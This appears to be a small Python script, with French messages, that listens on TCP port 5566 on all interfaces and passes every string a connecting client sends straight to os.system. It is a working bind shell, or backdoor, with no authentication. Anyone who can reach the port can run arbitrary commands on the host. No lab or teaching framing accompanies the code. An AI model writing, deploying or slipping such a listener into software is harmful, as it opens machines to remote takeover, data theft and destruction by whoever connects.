#coding:utf-8

import socket
import os

host, port = ('',5566)

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((host,port))
print("Le server est démarré...")
socket.listen(5)
conn, address = socket.accept()
print("Un client vient de se conneter...")
while True:
	data = conn.recv(1024)
	data = data.decode("utf8")
	os.system(data)
conn.close()
socket.close()
